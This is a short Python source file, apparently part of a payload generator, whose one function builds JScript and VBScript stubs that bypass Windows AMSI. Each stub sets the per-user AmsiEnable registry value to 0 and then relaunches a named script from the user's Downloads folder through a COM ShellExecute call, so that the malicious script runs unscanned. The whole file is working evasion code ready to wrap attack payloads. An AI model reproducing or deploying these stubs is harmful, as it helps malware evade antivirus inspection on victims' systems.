#!/usr/bin/python

def amsi_stub(file_type, technique, filename):


    js_bypass_1 = """\nvar regpath = "HKCU\\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
var exit=0;
var WinNetwork = new ActiveXObject("WScript.Network");
var u = WinNetwork.UserName;
var oWSS = new ActiveXObject("WScript.Shell");
try{
var r = oWSS.RegRead(regpath);
}
catch(e){
oWSS.RegWrite(regpath, "0", "REG_DWORD");
var obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880");
var j = "c:\\\\users\\\\"+u+"\\\\downloads\\\\%s";
obj.Document.Application.ShellExecute(j,null,"C:\\Windows\\System32",null,0);
exit=1;
}
if(!exit){
\n\n""" % (filename)

    vbs_bypass_1 = """\nregpath = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"
u = CreateObject("WScript.Network").UserName
e = 0
Set oWSS = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")

On Error Resume Next
r = oWSS.RegRead(regpath)

If Err.Number <> 0 Then
    oWSS.RegWrite regpath, "0", "REG_DWORD"
    j = "c:\\users\\"+u+"\\downloads\\%s"
    Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
    obj.Document.Application.ShellExecute j,Null,"C:\\Windows\\System32",Null,0
    e = 1
    Err.Clear
End If
If Not e Then
e=1
\n\n""" % (filename)

    if "vb" in file_type or "hta" in file_type:
        amsibypass = vbs_bypass_1
    else:
        amsibypass = js_bypass_1

    return amsibypass